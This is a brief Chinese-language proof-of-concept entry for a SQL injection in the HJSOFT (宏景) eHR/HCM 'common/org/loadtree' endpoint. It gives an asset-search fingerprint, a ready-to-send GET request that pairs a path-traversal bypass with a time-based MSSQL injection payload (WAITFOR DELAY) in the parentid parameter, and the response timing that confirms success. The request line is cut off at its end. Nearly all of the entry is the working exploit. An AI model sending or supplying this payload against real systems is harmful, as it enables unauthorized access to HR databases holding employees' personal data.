# 宏景eHRcommonorgloadtreeSQL注入漏洞

宏景eHRcommonorgloadtree ｜ SQL注入 ｜ —
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`GET /w_selfservice/oauthservlet/%2e./.%2e/common/org/loadtree?params=child&treetype=1&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&kind=2&issuperuser=1&manageprive=1&action=1&target=1&backdate=1&ju`
- **响应特征**：400 响应时间>=5s